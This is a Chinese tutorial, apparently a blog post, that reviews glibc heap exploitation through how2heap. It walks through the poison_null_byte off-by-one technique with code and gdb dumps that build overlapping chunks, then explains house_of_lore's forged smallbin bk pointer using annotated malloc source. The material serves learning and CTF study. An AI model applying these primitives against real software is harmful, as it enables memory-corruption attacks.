紧着上次的继续
通过 how2heap 复习堆利用 (一） 
### 0x07 poison_null_byte
off-one-by-one 的经典例子，一个0字节溢出。在一个字节溢出中，通常有以下情景：
  1. 扩展块
  2. 收缩块
首先，我们创建了 a b c barrier 四个chunk。
    a = (uint8_t*) malloc(0x100);
        fprintf(stderr, "a: %p\n", a);
        int real_a_size = malloc_usable_size(a);
        fprintf(stderr, "Since we want to overflow 'a', we need to know the 'real' size of 'a' "
            "(it may be more than 0x100 because of rounding): %#x\n", real_a_size);
        /* chunk size attribute cannot have a least significant byte with a value of 0x00.
         * the least significant byte of this will be 0x10, because the size of the chunk includes
         * the amount requested plus some amount required for the metadata. */
        b = (uint8_t*) malloc(0x200);
        fprintf(stderr, "b: %p\n", b);
        c = (uint8_t*) malloc(0x100);
        fprintf(stderr, "c: %p\n", c);
        barrier =  malloc(0x100);
        fprintf(stderr, "We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"
            "The barrier is not strictly necessary, but makes things less confusing\n", barrier);
值得一提的是， barrier 这个chunk是用来防止 free c 的时候被放入 top-chunk。以及 b c 的 chunk 大小不能为
fastbins chunk size。因为 fastbins chunk 在被释放后不会合并。chunk a的作用是用来制造单字节溢出。
在进行一字节溢出之前，由于我们通过 chunk a 的单字节溢出修改了 chunk b 的 size ，为了绕过 unlink 的checnk
，我们先伪造一个 c prev_size。 计算方法如下：
    c.prev_size = b_size & 0xff00
计算结果就是
    0x200 = 0x211 & 0xff00
正好是 NULL 字节溢出之后的值。紧接着我们 free 掉 chunk b。此时 chunk 布局如下：
    PwnLife> x/124gx 0x603000
    0x603000:   0x0000000000000000  0x0000000000000111          unsortedbin
    unsortedbin
    all: 0x603110 —▸ 0x7ffff7dd1b58 (main_arena+88) ◂— 0x603110
然后我们利用 一字节溢出 修改 chunk b size。
这个时候我们发现 chunk b 的 size 已经成功被修改，同时我们也 fake 了 个 chunk c。
*** bypass : chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))**
紧接着我们 create chunk b1 ，系统会从 free 掉的chunk b 中（已经放入 unsortedbin 取出合适的大小）。
    PwnLife> p b1
    $25 = (uint8_t *) 0x603120 "H\035\335\367\377\177"
    PwnLife> p b
    $26 = (uint8_t *) 0x603120 "H\035\335\367\377\177"
我们注意到几个地方：
  1. chunk b1 的位置就是 chunk b 的位置
  2. 这个时候 b1 和 c 之间有个 chunk b，这个时候 chunk c 的 prev_size 本应该变为 0xf0。但是事实上是
###
    PwnLife> x/30gx 0x603330-0x20
    0x603310:   0x00000000000000f0  0x0000000000000000               p c
    $30 = (uint8_t *) 0x603330 ""               ,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
此时 chunk b2 已经被吞并。
然后我们在把这块 chunk create出来。假设我们之前对 chunk b2 写的是一个指针。此时我们 得到的新 chunk d。我们可以对chunk
b2的内容进行任意读写了。
    98  fprintf(stderr, "Finally, we allocate 'd', overlapping 'b2'.\n");
        99  d = malloc(0x300);
       100  fprintf(stderr, "d: %p\n",d);
       101
     ► 102  fprintf(stderr, "Now 'd' and 'b2' overlap.\n");
       103  memset(d,'D',0x300);
       104
       105  fprintf(stderr, "New b2 content:\n%s\n",b2);
### 0x08 house_of_lore
house of lore 技术主要是用来伪造一个 small bin 链。
  * House of Lore 攻击与 Glibc 堆管理中的的 Small Bin 的机制紧密相关。
  * House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。
  * House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。
如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行的流程如下
    /*
           If a small request, check regular bin.  Since these "smallbins"
           hold one size each, no searching within bins is necessary.
           (For a large request, we need to wait until unsorted chunks are
           processed to find best fit. But for small ones, fits are exact
           anyway, so we can check now, which is faster.)
         */
        if (in_smallbin_range(nb)) {
            // 获取 small bin 的索引
            idx = smallbin_index(nb);
            // 获取对应 small bin 中的 chunk 指针
            bin = bin_at(av, idx);
            // 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk
            // 如果 victim = bin ，那说明该 bin 为空。
            // 如果不相等，那么会有两种情况
            if ((victim = last(bin)) != bin) {
                // 第一种情况，small bin 还没有初始化。
                if (victim == 0) /* initialization check */
                    // 执行初始化，将 fast bins 中的 chunk 进行合并
                    malloc_consolidate(av);
                // 第二种情况，small bin 中存在空闲的 chunk
                else {
                    // 获取 small bin 中倒数第二个 chunk 。
                    bck = victim->bk;
                    // 检查 bck->fd 是不是 victim，防止伪造
                    if (__glibc_unlikely(bck->fd != victim)) {
                        errstr = "malloc(): smallbin double linked list corrupted";
                        goto errout;
                    }
                    // 设置 victim 对应的 inuse 位
                    set_inuse_bit_at_offset(victim, nb);
                    // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来
                    bin->bk = bck;
                    bck->fd = bin;
                    // 如果不是 main_arena，设置对应的标志
                    if (av != &main_arena) set_non_main_arena(victim);
                    // 细致的检查
                    check_malloced_chunk(av, victim, nb);
                    // 将申请到的 chunk 转化为对应的 mem 状态
                    void *p = chunk2mem(victim);
                    // 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff
                    alloc_perturb(p, bytes);
                    return p;
                }
            }
        }
从下面的这部分我们可以看出
    // 获取 small bin 中倒数第二个 chunk 。
                    bck = victim->bk;
                    // 检查 bck->fd 是不是 victim，防止伪造
                    if (__glibc_unlikely(bck->fd != victim)) {
                        errstr = "malloc(): smallbin double linked list corrupted";
                        goto errout;
                    }
                    // 设置 victim 对应的 inuse 位
                    set_inuse_bit_at_offset(victim, nb);
                    // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来
                    bin->bk = bck;
                    bck->fd = bin;
如果我们可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的fake chunk，并且同时满足之后的 bck->fd !=
victim 的检测，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake chunk。也就是说，当下一次申请 small bin
的时候，我们就会分配到指定位置的 fake chun。
调试：
首先，我们创建一个 small bin chunk。然后在栈上伪造两个 chunk。